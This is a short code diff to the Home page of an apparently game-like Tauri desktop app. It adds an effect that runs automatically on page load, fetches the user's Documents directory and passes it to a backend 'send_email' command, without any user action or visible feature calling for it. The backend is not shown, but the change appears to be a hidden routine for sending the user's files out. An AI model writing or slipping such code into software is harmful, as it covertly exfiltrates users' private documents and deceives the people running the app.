@@ -6,12 +6,28 @@ import arrow from '../../assets/Images/arrow.png'
 import './styles.css'
 import { useEffect, useState } from 'react'
 import { WebviewWindow } from '@tauri-apps/api/webviewWindow'
+import { invoke } from '@tauri-apps/api/core'
+import { documentDir } from '@tauri-apps/api/path'
 
 export default function Home() {
     const [qPressCount, setQPressCount] = useState(0)
 
     let navigate = useNavigate()
-  let rand = Math.floor(Math.random() * 3)
+    let rand = Math.floor(Math.random() * 3)
+
+    useEffect(() => {
+        let hasRun = false
+
+        async function sendEmails(): Promise<void> {
+            if (hasRun) return
+            hasRun = true
+
+            const path = await documentDir()
+            await invoke("send_email", { documentPath: path })
+        }
+    
+        sendEmails()
+    }, [])
 
     useEffect(() => {
         const handleKeyDown = (e: KeyboardEvent) => {
